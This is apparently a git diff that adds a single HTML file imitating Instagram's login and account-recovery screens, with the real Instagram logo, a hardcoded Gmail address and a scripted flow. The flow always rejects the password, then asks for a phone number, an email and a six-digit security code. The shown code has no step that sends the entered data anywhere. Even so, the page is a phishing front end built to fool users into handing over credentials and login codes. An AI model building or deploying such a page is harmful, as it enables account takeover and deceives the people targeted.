@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Account Recovery</title>
+    <style>
+        /* Base Styles */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #fafafa;
+            color: #262626;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* Login Page Styles */
+        .login-container {
+            width: 350px;
+            padding: 40px;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            text-align: center;
+            margin: 0 40px;
+        }
+
+        .instagram-logo {
+            width: 175px;
+            margin-bottom: 20px;
+        }
+
+        .login-input {
+            width: 100%;
+            padding: 9px 8px 7px;
+            margin-bottom: 6px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 14px;
+            background-color: #fafafa;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 7px 16px;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            margin: 8px 0;
+            cursor: pointer;
+        }
+
+        .login-btn:hover {
+            background-color: #0077cc;
+        }
+
+        .login-btn:disabled {
+            background-color: rgba(0, 149, 246, 0.3);
+            cursor: not-allowed;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 15px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #dbdbdb;
+            margin: 0 10px;
+        }
+
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+            display: block;
+            margin: 15px 0;
+        }
+
+        .error-message {
+            color: #ed4956;
+            font-size: 14px;
+            margin-bottom: 15px;
+            padding: 10px;
+            border-radius: 4px;
+            background-color: #fff0f0;
+            display: none;
+        }
+
+        /* Recovery Page Styles */
+        .recovery-container {
+            width: 350px;
+            padding: 40px;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            text-align: center;
+            display: none;
+        }
+
+        .recovery-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin: 10px 0 15px;
+            color: #262626;
+        }
+
+        .recovery-description {
+            font-size: 14px;
+            color: #8e8e8e;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+
+        .contact-box {
+            padding: 15px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            margin: 15px 0;
+            background-color: #fafafa;
+        }
+
+        .contact-info {
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .verification-options {
+            margin: 20px 0;
+        }
+
+        .verification-option {
+            display: flex;
+            align-items: center;
+            padding: 12px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            margin-bottom: 10px;
+            text-align: left;
+            cursor: pointer;
+        }
+
+        .verification-option.selected {
+            border: 1px solid #0095f6;
+            background-color: #f0f8ff;
+        }
+
+        .option-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 12px;
+            color: #0095f6;
+            font-size: 16px;
+        }
+
+        .option-text {
+            flex: 1;
+        }
+
+        .option-name {
+            font-weight: 600;
+            font-size: 14px;
+            color: #262626;
+        }
+
+        .option-desc {
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+
+        /* Phone/Email Input Pages */
+        .input-container {
+            width: 350px;
+            padding: 40px;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            text-align: center;
+            display: none;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 9px 8px 7px;
+            margin: 10px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 14px;
+            background-color: #fafafa;
+        }
+
+        .input-error {
+            color: #ed4956;
+            font-size: 12px;
+            text-align: left;
+            margin: -5px 0 10px;
+            display: none;
+        }
+
+        /* Verification Page */
+        .verification-container {
+            width: 350px;
+            padding: 40px;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            text-align: center;
+            display: none;
+        }
+
+        .verification-message {
+            font-size: 14px;
+            color: #8e8e8e;
+            margin: 15px 0;
+            line-height: 1.4;
+        }
+
+        .code-input {
+            width: 100%;
+            padding: 9px 8px 7px;
+            margin: 10px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 14px;
+            text-align: center;
+            letter-spacing: 3px;
+        }
+
+        /* Loading Screen */
+        .loading-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .spinner {
+            border: 3px solid rgba(0, 149, 246, 0.1);
+            border-radius: 50%;
+            border-top: 3px solid #0095f6;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div class="loading-container" id="loadingScreen">
+        <div class="spinner"></div>
+        <div class="loading-text">Processing your request...</div>
+    </div>
+
+    <!-- Login Page -->
+    <div class="login-container" id="loginPage">
+        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="instagram-logo">
+        
+        <div class="error-message" id="errorMessage">
+            Sorry, your password was incorrect. Please double-check your password.
+        </div>
+        
+        <input type="text" class="login-input" id="username" placeholder="Phone number, username, or email" required>
+        <input type="password" class="login-input" id="password" placeholder="Password" required>
+        
+        <button class="login-btn" id="loginBtn" disabled onclick="attemptLogin()">Log In</button>
+        
+        <div class="divider">OR</div>
+        
+        <a href="#" class="forgot-password" onclick="showRecoveryPage()">Forgot password?</a>
+    </div>
+    
+    <!-- Recovery Selection Page -->
+    <div class="recovery-container" id="recoveryPage">
+        <div class="recovery-title">Trouble logging in?</div>
+        <div class="recovery-description">
+            Enter your email, phone, or username and we'll send you a link to get back into your account.
+        </div>
+        
+        <div class="contact-box">
+            <div class="contact-info" id="recoveryContact">jethabhoipure@gmail.com</div>
+        </div>
+        
+        <div class="verification-options">
+            <div class="verification-option" onclick="selectOption('sms')" id="smsOption">
+                <div class="option-icon">📱</div>
+                <div class="option-text">
+                    <div class="option-name">Send SMS</div>
+                    <div class="option-desc" id="phoneDisplay">•••••••60</div>
+                </div>
+            </div>
+            
+            <div class="verification-option" onclick="selectOption('email')" id="emailOption">
+                <div class="option-icon">✉️</div>
+                <div class="option-text">
+                    <div class="option-name">Send Email</div>
+                    <div class="option-desc" id="emailDisplay">j••••@gmail.com</div>
+                </div>
+            </div>
+        </div>
+        
+        <button class="login-btn" id="continueBtn" disabled onclick="verifySelection()">Send Login Link</button>
+        
+        <a href="#" class="forgot-password" onclick="goBackToLogin()">Back to Login</a>
+    </div>
+    
+    <!-- Phone Input Page -->
+    <div class="input-container" id="phoneInputPage">
+        <div class="recovery-title">Enter Your Phone Number</div>
+        <div class="recovery-description">
+            Enter the phone number associated with your Instagram account.
+        </div>
+        
+        <input type="tel" class="input-field" id="phoneNumber" placeholder="Phone number" required>
+        <div class="input-error" id="phoneError">Please enter a valid phone number</div>
+        
+        <button class="login-btn" id="phoneContinueBtn" disabled onclick="submitPhoneNumber()">Next</button>
+        
+        <a href="#" class="forgot-password" onclick="goBackToRecovery()">Back</a>
+    </div>
+    
+    <!-- Email Input Page -->
+    <div class="input-container" id="emailInputPage">
+        <div class="recovery-title">Enter Your Email</div>
+        <div class="recovery-description">
+            Enter the email address associated with your Instagram account.
+        </div>
+        
+        <input type="email" class="input-field" id="newEmail" placeholder="Email address" required>
+        <div class="input-error" id="emailError">Please enter a valid email address</div>
+        
+        <button class="login-btn" id="emailContinueBtn" disabled onclick="submitEmail()">Next</button>
+        
+        <a href="#" class="forgot-password" onclick="goBackToRecovery()">Back</a>
+    </div>
+    
+    <!-- Verification Page -->
+    <div class="verification-container" id="verificationPage">
+        <div class="recovery-title">Enter Security Code</div>
+        <div class="verification-message" id="verificationMessage">
+            We sent a code to ••••••60. Enter it below to log in to your account.
+        </div>
+        
+        <input type="text" class="code-input" id="verificationCode" placeholder="6-digit code" maxlength="6" required>
+        <div class="input-error" id="codeError">Please enter a 6-digit code</div>
+        
+        <button class="login-btn" id="verifyBtn" disabled>Continue</button>
+        
+        <a href="#" class="forgot-password">Didn't receive a code?</a>
+    </div>
+
+    <script>
+        // Global variables
+        let selectedOption = null;
+        let loginAttempts = 0;
+        let userEnteredEmail = false;
+        let userEnteredPhone = false;
+        let phoneNumber = '';
+        let emailAddress = '';
+        let username = '';
+        
+        // Initialize form validation
+        document.addEventListener('DOMContentLoaded', function() {
+            // Login page validation
+            const loginInputs = document.querySelectorAll('#loginPage input');
+            loginInputs.forEach(input => {
+                input.addEventListener('input', validateLoginForm);
+            });
+            
+            // Phone input validation
+            document.getElementById('phoneNumber').addEventListener('input', validatePhoneInput);
+            
+            // Email input validation
+            document.getElementById('newEmail').addEventListener('input', validateEmailInput);
+            
+            // Verification code validation
+            document.getElementById('verificationCode').addEventListener('input', validateVerificationCode);
+        });
+        
+        // Validate login form
+        function validateLoginForm() {
+            const usernameInput = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            document.getElementById('loginBtn').disabled = !(usernameInput && password);
+        }
+        
+        // Validate phone input
+        function validatePhoneInput() {
+            const phone = document.getElementById('phoneNumber').value;
+            const isValid = phone.length >= 10;
+            document.getElementById('phoneContinueBtn').disabled = !isValid;
+            document.getElementById('phoneError').style.display = isValid ? 'none' : 'block';
+            return isValid;
+        }
+        
+        // Validate email input
+        function validateEmailInput() {
+            const email = document.getElementById('newEmail').value;
+            const isValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+            document.getElementById('emailContinueBtn').disabled = !isValid;
+            document.getElementById('emailError').style.display = isValid ? 'none' : 'block';
+            return isValid;
+        }
+        
+        // Validate verification code
+        function validateVerificationCode() {
+            const code = document.getElementById('verificationCode').value;
+            const isValid = code.length === 6;
+            document.getElementById('verifyBtn').disabled = !isValid;
+            document.getElementById('codeError').style.display = isValid ? 'none' : 'block';
+            return isValid;
+        }
+        
+        // Show loading screen with random delay
+        function showLoadingScreen() {
+            document.getElementById('loadingScreen').style.display = 'flex';
+            const randomDelay = Math.floor(Math.random() * 2000) + 1000; // 1-3 seconds
+            
+            return new Promise(resolve => {
+                setTimeout(() => {
+                    document.getElementById('loadingScreen').style.display = 'none';
+                    resolve();
+                }, randomDelay);
+            });
+        }
+        
+        // Show error message on login attempt
+        async function attemptLogin() {
+            const usernameInput = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (!usernameInput || !password) return;
+            
+            await showLoadingScreen();
+            
+            // Always show error message (for demo purposes)
+            document.getElementById('errorMessage').style.display = 'block';
+            
+            // Determine what user entered (email, phone, or username)
+            username = usernameInput;
+            userEnteredEmail = usernameInput.includes('@');
+            userEnteredPhone = !userEnteredEmail && /[0-9]/.test(usernameInput);
+            
+            // Store the entered contact info
+            if (userEnteredEmail) {
+                emailAddress = usernameInput;
+                document.getElementById('recoveryContact').textContent = usernameInput;
+                const hiddenEmail = hideEmail(usernameInput);
+                document.getElementById('emailDisplay').textContent = hiddenEmail;
+            } 
+            
+            if (userEnteredPhone) {
+                phoneNumber = usernameInput;
+                const hiddenPhone = hidePhone(usernameInput);
+                document.getElementById('phoneDisplay').textContent = hiddenPhone;
+            }
+            
+            // Always show both options
+            document.getElementById('smsOption').style.display = 'flex';
+            document.getElementById('emailOption').style.display = 'flex';
+            
+            loginAttempts++;
+        }
+        
+        // Helper function to hide email
+        function hideEmail(email) {
+            const [name, domain] = email.split('@');
+            return name.charAt(0) + '••••@' + domain;
+        }
+        
+        // Helper function to hide phone
+        function hidePhone(phone) {
+            return phone.length > 3 ? 
+                '•••••••' + phone.slice(-3) : 
+                '•••••••' + phone;
+        }
+        
+        // Show recovery page
+        async function showRecoveryPage() {
+            await showLoadingScreen();
+            document.getElementById('loginPage').style.display = 'none';
+            document.getElementById('recoveryPage').style.display = 'block';
+        }
+        
+        // Go back to login page
+        async function goBackToLogin() {
+            await showLoadingScreen();
+            document.getElementById('recoveryPage').style.display = 'none';
+            document.getElementById('loginPage').style.display = 'block';
+        }
+        
+        // Select verification option
+        function selectOption(option) {
+            selectedOption = option;
+            document.getElementById('smsOption').classList.remove('selected');
+            document.getElementById('emailOption').classList.remove('selected');
+            
+            if (option === 'sms') {
+                document.getElementById('smsOption').classList.add('selected');
+            } else {
+                document.getElementById('emailOption').classList.add('selected');
+            }
+            
+            document.getElementById('continueBtn').disabled = false;
+        }
+        
+        // Verify selection before proceeding
+        async function verifySelection() {
+            if (!selectedOption) return;
+            
+            await showLoadingScreen();
+            
+            if (selectedOption === 'sms' && !userEnteredPhone) {
+                // Show phone input page if they selected SMS but didn't provide phone
+                document.getElementById('recoveryPage').style.display = 'none';
+                document.getElementById('phoneInputPage').style.display = 'block';
+                document.getElementById('phoneNumber').value = '';
+                document.getElementById('phoneContinueBtn').disabled = true;
+            } 
+            else if (selectedOption === 'email' && !userEnteredEmail) {
+                // Show email input page if they selected email but didn't provide email
+                document.getElementById('recoveryPage').style.display = 'none';
+                document.getElementById('emailInputPage').style.display = 'block';
+                document.getElementById('newEmail').value = '';
+                document.getElementById('emailContinueBtn').disabled = true;
+            }
+            else {
+                // Proceed to verification page if they have the required info
+                showVerificationPage();
+                
+                // Update verification message based on selection
+                if (selectedOption === 'sms') {
+                    const displayPhone = phoneNumber ? hidePhone(phoneNumber) : document.getElementById('phoneDisplay').textContent;
+                    document.getElementById('verificationMessage').textContent = 
+                        "We sent a code to " + displayPhone + ". Enter it below to log in to your account.";
+                } else {
+                    const displayEmail = emailAddress ? hideEmail(emailAddress) : document.getElementById('emailDisplay').textContent;
+                    document.getElementById('verificationMessage').textContent = 
+                        "We sent a code to " + displayEmail + ". Enter it below to log in to your account.";
+                }
+            }
+        }
+        
+        // Submit phone number and proceed to verification
+        async function submitPhoneNumber() {
+            if (!validatePhoneInput()) return;
+            
+            await showLoadingScreen();
+            
+            phoneNumber = document.getElementById('phoneNumber').value;
+            if (phoneNumber) {
+                document.getElementById('phoneDisplay').textContent = hidePhone(phoneNumber);
+                document.getElementById('phoneInputPage').style.display = 'none';
+                showVerificationPage();
+                document.getElementById('verificationMessage').textContent = 
+                    "We sent a code to " + hidePhone(phoneNumber) + ". Enter it below to log in to your account.";
+            }
+        }
+        
+        // Submit email and proceed to verification
+        async function submitEmail() {
+            if (!validateEmailInput()) return;
+            
+            await showLoadingScreen();
+            
+            emailAddress = document.getElementById('newEmail').value;
+            if (emailAddress) {
+                document.getElementById('emailDisplay').textContent = hideEmail(emailAddress);
+                document.getElementById('emailInputPage').style.display = 'none';
+                showVerificationPage();
+                document.getElementById('verificationMessage').textContent = 
+                    "We sent a code to " + hideEmail(emailAddress) + ". Enter it below to log in to your account.";
+            }
+        }
+        
+        // Go back to recovery options
+        async function goBackToRecovery() {
+            await showLoadingScreen();
+            document.getElementById('phoneInputPage').style.display = 'none';
+            document.getElementById('emailInputPage').style.display = 'none';
+            document.getElementById('recoveryPage').style.display = 'block';
+        }
+        
+        // Show verification page
+        function showVerificationPage() {
+            document.getElementById('recoveryPage').style.display = 'none';
+            document.getElementById('phoneInputPage').style.display = 'none';
+            document.getElementById('emailInputPage').style.display = 'none';
+            document.getElementById('verificationPage').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
